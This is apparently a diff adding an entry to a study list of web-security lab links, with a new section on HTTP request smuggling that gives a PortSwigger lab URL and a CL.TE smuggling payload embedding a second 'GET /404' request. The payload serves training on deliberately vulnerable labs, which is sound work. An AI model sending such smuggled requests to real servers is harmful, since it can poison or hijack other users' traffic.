@@ -44,3 +44,12 @@ Lab: https://bwapp.hakhub.net/rlfi.php
 # Command Injection
 Lab : https://bwapp.hakhub.net/commandi.php
 
+# HTTP Splitting Smuggling
+Lab : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses
+Payload : 
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
